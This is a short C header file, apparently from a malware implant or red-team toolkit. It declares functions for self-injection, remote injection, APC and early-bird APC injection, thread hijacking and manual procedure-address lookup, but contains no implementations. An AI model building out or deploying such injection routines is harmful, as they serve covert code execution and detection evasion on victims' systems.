#pragma once

VOID inject_self(IMPLANT_CONFIG config);
VOID remote_inject();
VOID apc_inject(IMPLANT_CONFIG config);
VOID early_apc_inject(IMPLANT_CONFIG config);
PVOID manual_procaddress(HMODULE mod_handle, const char* funcName);
VOID thread_hijack(IMPLANT_CONFIG config);